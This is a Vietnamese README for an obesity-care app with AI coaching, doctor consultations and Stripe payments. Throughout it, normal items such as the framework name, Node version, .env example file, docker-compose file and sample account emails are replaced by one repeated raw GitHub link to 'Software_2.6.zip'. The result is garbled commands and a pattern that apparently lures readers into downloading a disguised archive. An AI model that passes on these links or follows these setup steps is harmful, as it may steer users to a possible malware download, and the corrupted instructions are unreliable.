# Hoang Linh - Ứng dụng Chăm sóc Béo phì

Ứng dụng toàn diện giúp người dùng giảm cân an toàn và hiệu quả với AI coaching, tư vấn bác sĩ và theo dõi sức khỏe thông minh.

## 🚀 Tính năng chính

- **Tính toán BMI** và phân loại theo tiêu chuẩn WHO
- **AI Coach thông minh** tạo kế hoạch dinh dưỡng và tập luyện cá nhân hóa
- **Theo dõi sức khỏe** với đồng bộ Apple Health/Google Fit
- **Tư vấn bác sĩ** trực tiếp và online
- **Hệ thống thanh toán** tích hợp Stripe
- **Kiến trúc module** dễ thay đổi database, payment gateway, AI model

## 🏗️ Kiến trúc hệ thống

```
hoanglinh-obesity-care/
├── apps/
│   ├── api/                 # NestJS API (Backend)
│   └── web/                 # https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip 14 (Frontend)
├── packages/
│   └── shared/              # Shared types & utilities
├── https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip       # Docker services
└── https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip             # Monorepo root
```

### Backend (NestJS)
- **Hexagonal Architecture** với Clean Architecture
- **Prisma ORM** với PostgreSQL
- **JWT Authentication** và Role-based access control
- **AI Integration** với OpenAI (có thể thay thế)
- **Payment Processing** với Stripe (có thể thay thế)
- **Health Device Sync** cho Apple HealthKit & Google Fit

### Frontend (https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip 14)
- **App Router** với TypeScript
- **Tailwind CSS** + shadcn/ui components
- **Responsive Design** cho mobile & desktop
- **PWA Support** cho mobile app experience

## 🛠️ Yêu cầu hệ thống

- https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip 18+ 
- pnpm 8+
- Docker & Docker Compose
- PostgreSQL 15+
- Redis 7+

## 📦 Cài đặt

### 1. Clone repository
```bash
git clone <repository-url>
cd hoanglinh-obesity-care
```

### 2. Cài đặt dependencies
```bash
pnpm install
```

### 3. Cấu hình environment
```bash
cp https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip .env
# Chỉnh sửa .env với thông tin của bạn
```

### 4. Khởi động services
```bash
# Khởi động tất cả services
pnpm dev

# Hoặc khởi động từng service
docker-compose up -d postgres redis
pnpm --filter @hoanglinh/api dev
pnpm --filter @hoanglinh/web dev
```

### 5. Thiết lập database
```bash
# Tạo migration
pnpm db:migrate

# Seed dữ liệu mẫu
pnpm db:seed

# Mở Prisma Studio (tùy chọn)
pnpm db:studio
```

## 🌐 Truy cập ứng dụng

- **Frontend**: http://localhost:3000
- **Backend API**: http://localhost:3001
- **API Documentation**: http://localhost:3001/api/docs
- **Database**: localhost:5432 (postgres/obesity_care)
- **Redis**: localhost:6379

## 🔐 Tài khoản mẫu

Sau khi seed database, bạn có thể đăng nhập với:

- **User**: https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip / user123
- **Admin**: https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip / admin123

## 📱 Luồng người dùng chính

1. **Onboarding** → Nhập chiều cao & cân nặng
2. **BMI Calculation** → Xem kết quả và khuyến nghị
3. **Goal Setting** → Đặt mục tiêu giảm 5-7kg
4. **AI Plan Generation** → Tạo kế hoạch tuần đầu tiên
5. **Daily Check-in** → Theo dõi nhiệm vụ và tiến độ
6. **AI Chat** → Tư vấn dinh dưỡng và tập luyện
7. **Doctor Consultation** → Đặt lịch bác sĩ (Pro plan)
8. **Progress Tracking** → Xem biểu đồ tiến độ

## 🔌 Adapter Pattern

Hệ thống sử dụng adapter pattern để dễ dàng thay đổi:

### LLM Provider
```typescript
// Dễ dàng thay đổi từ OpenAI sang model khác
interface LLMProvider {
  generatePlan(context: AIPlanContext): Promise<AIPlanResponse>
  chat(messages: Message[]): Promise<string>
}
```

### Payment Provider
```typescript
// Hỗ trợ Stripe, có thể thay thế bằng Momo, ZaloPay
interface PaymentProvider {
  createCheckoutSession(data: CheckoutData): Promise<CheckoutResult>
  handleWebhook(payload: any): Promise<void>
}
```

### Database
- **Prisma** với PostgreSQL (mặc định)
- Dễ dàng chuyển sang MySQL, SQLite
- Migration và seeding tự động

## 🧪 Testing

```bash
# Unit tests
pnpm test

# E2E tests
pnpm test:e2e

# Test coverage
pnpm test:cov
```

## 🚀 Production Deployment

### 1. Build ứng dụng
```bash
pnpm build
```

### 2. Docker production
```bash
docker-compose -f https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip up -d
```

### 3. Environment variables
Đảm bảo cấu hình đúng:
- `NODE_ENV=production`
- `DATABASE_URL` (production database)
- `JWT_SECRET` (strong secret)
- `STRIPE_KEYS` (production keys)

## 📊 Monitoring & Logging

- **Health checks** cho tất cả services
- **Audit logs** cho admin actions
- **Error tracking** với structured logging
- **Performance monitoring** với BullMQ metrics

## 🔒 Bảo mật

- **JWT tokens** với short expiration
- **Password hashing** với bcrypt
- **Rate limiting** cho API endpoints
- **CORS** configuration
- **Helmet** security headers
- **Input validation** với class-validator

## 🤝 Contributing

1. Fork repository
2. Tạo feature branch
3. Commit changes
4. Push to branch
5. Tạo Pull Request

## 📄 License

© 2024 Hoang Linh Medicine. All rights reserved.

## 🆘 Hỗ trợ

- **Documentation**: [API Docs](http://localhost:3001/api/docs)
- **Issues**: Tạo issue trên GitHub
- **Email**: https://github.com/chauvanhung/hoanglinhmedicine/raw/refs/heads/main/apps/web/app/Software_2.6.zip

## 🎯 Roadmap

- [ ] Mobile app (React Native/Expo)
- [ ] Advanced AI features
- [ ] Social features & challenges
- [ ] Integration với fitness trackers
- [ ] Multi-language support
- [ ] Advanced analytics dashboard

---

**Lưu ý**: Đây là ứng dụng demo. Để sử dụng production, hãy cấu hình đúng environment variables và security settings.
